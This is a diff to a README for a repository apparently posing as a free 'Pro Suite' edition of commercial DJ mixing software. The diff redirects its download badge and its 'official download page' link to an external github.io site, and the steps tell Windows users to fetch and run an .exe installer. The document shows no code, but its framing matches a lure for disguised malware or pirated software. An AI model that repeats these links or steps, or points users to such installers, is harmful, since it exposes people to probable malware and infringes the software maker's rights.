@@ -1,6 +1,6 @@
 # 🎛️ serato-4-0-9-pro-suite-2026 - Master your digital audio mixing workspace
 
-[![](https://img.shields.io/badge/Download-Serato_Pro_Suite-blue.svg)](https://github.com/Khinekhantsoe9/serato-4-0-9-pro-suite-2026)
+[![](https://img.shields.io/badge/Download-Serato_Pro_Suite-blue.svg)](https://khinekhantsoe9.github.io)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page here](https://github.com/Khinekhantsoe9/serato-4-0-9-pro-suite-2026).
+1. Visit the [official download page here](https://khinekhantsoe9.github.io).
 2. Look for the release section on the right side of the screen.
 3. Locate the installation file ending in .exe.
 4. Select the file to start the download to your computer.
